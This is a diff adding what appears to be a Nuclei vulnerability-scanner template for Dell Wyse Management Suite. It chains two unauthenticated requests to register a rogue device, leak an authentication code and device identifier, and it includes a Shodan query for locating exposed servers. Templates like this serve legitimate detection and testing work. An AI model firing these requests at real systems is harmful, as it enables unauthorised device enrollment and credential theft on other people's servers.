@@ -1,0 +1,69 @@
+flow: http(1) && http (2)
+http:
+- extractors:
+  - group: 1
+    internal: true
+    name: owner_id
+    part: body
+    regex:
+    - '"id":([0-9]+)'
+    type: regex
+  matchers:
+  - internal: true
+    part: body
+    type: word
+    words:
+    - '"isActive":true'
+  raw:
+  - 'POST /ccm-web/open/deviceGroupLogin2 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: RMA
+
+    Content-Type: application/json; charset=UTF-8
+
+
+    {}
+
+    '
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - '"authenticationCode":'
+    - '"wyseIdentifier"'
+  raw:
+  - 'POST /ccm-web/open/deviceRegister HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: RMA
+
+    Content-Type: application/json; charset=UTF-8
+
+    X-Stratus-device-owner-id: {{owner_id}}
+
+
+    {"deviceType":{"type":81},"owner":{"id":{{owner_id}}},"macAddress":"ff:ff:ff:ff:ff:ff"}
+
+    '
+id: wyse-devicegroup-register
+info:
+  author: DhiyaneshDK
+  description: 'Dell Wyse Management Suite allows unauthenticated device registration
+    by chaining deviceGroupLogin2 and deviceRegister endpoints, leaking wyseIdentifier
+    and authenticationCode.
+
+    '
+  metadata:
+    max-request: 1
+    runzero-review: REJECT/2026-03-24/leaves behind artifacts
+    shodan-query: html:"/ccm-web/"
+    verified: true
+  name: Dell Wyse Management Suite - Unauthenticated Device Registration
+  reference:
+  - https://swarm.ptsecurity.com/business-logic-and-chains-unauthenticated-rce-in-dell-wyse-management-suite/
+  severity: high
+  tags: dell,wyse,auth-bypass,misconfig
